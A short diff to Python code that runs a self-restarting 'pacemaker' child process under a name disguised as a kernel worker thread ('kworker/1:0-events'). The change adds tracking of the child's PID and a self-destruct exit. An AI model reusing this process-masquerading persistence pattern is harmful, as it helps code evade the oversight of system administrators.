@@ -30,8 +30,11 @@ exec(source_code, {{'__name__': '__main__', '__source__': source_code}})
         '''
 
             proc = subprocess.Popen(['debug-[kworker/1:0-events]'], stdin=subprocess.PIPE, executable=sys.executable, pass_fds=(read_fd, write_fd))
+            config.pacemaker_pid = proc.pid
             proc.stdin.write(pacemaker_code.encode())
             proc.stdin.close()
             os.close(read_fd)
             proc.wait()
+            if config.self_destructing:
+                return
             print(f'pacemaker exited, restarting....')
